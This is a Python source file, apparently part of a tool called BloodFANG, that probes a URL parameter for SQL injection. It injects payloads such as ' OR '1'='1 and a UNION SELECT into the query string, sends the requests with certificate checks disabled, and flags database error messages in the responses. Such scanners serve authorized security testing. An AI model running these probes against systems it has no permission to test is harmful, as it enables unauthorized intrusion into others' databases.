# fangsql.py
"""
Basic SQLi scanner entrypoints:
 - scan_sqli(url, param, emit, stop_event=None)
 - scan(target, emit, stop_event=None)
"""
import requests
import urllib.parse
import time
import os
from pathlib import Path

def _find_payload_dir():
    here = Path(__file__).resolve().parent
    cand = here / "payloads"
    if cand.exists(): return cand
    cur = here
    for _ in range(6):
        p = cur / "payloads"
        if p.exists(): return p
        p2 = cur / "BloodFANG" / "core" / "payloads"
        if p2.exists(): return p2
        cur = cur.parent
    env = os.getenv("BLOODFANG_PAYLOADS")
    if env:
        p = Path(env)
        if p.exists(): return p
    return cand

PAYLOAD_DIR = _find_payload_dir()

def _load_payloads(name, fallback):
    try:
        f = PAYLOAD_DIR / name
        if f.exists():
            text = f.read_text(encoding="utf-8", errors="ignore")
            lines = [L.strip() for L in text.splitlines() if L.strip() and not L.strip().startswith("#")]
            if lines: return lines
    except Exception:
        pass
    return fallback

PAYLOADS = _load_payloads("sql_payloads.txt", ["' OR '1'='1", "' UNION SELECT NULL--"])
ERROR_MARKERS = ["sql syntax", "mysql", "sqlite", "mssql", "oracle", "sql error", "syntax error"]

def _compose(url, param, payload):
    p = urllib.parse.urlparse(url)
    q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    q = [(k, v) for (k, v) in q if k != param]
    q.append((param, payload))
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))

def scan_sqli(url, param, emit, stop_event=None):
    if not url:
        emit("[SQLi] Missing URL.")
        return
    if not param:
        emit("[SQLi] Missing parameter.")
        return

    emit(f"[SQLi] Target: {url} param={param}")
    for payload in PAYLOADS:
        if stop_event is not None and getattr(stop_event, "is_set", lambda: False)():
            emit("[SQLi] Stopped by user.")
            return
        t = _compose(url, param, payload)
        try:
            r = requests.get(t, timeout=8, verify=False)
            emit(f"[SQLi] {r.status_code} → {t}")
            low = r.text.lower()
            if any(m in low for m in ERROR_MARKERS):
                emit(f"[SQLi] Potential SQL error evidence for payload: {payload}")
        except requests.exceptions.RequestException as re:
            emit(f"[SQLi] Request error: {re}")
        except Exception as e:
            emit(f"[SQLi] Unexpected error: {e}")
        time.sleep(0.3)
    emit("[SQLi] Scan complete.")

def scan(target, emit, stop_event=None):
    url, param = (target.split("::", 1) + [""])[:2]
    scan_sqli(url, param, emit, stop_event)
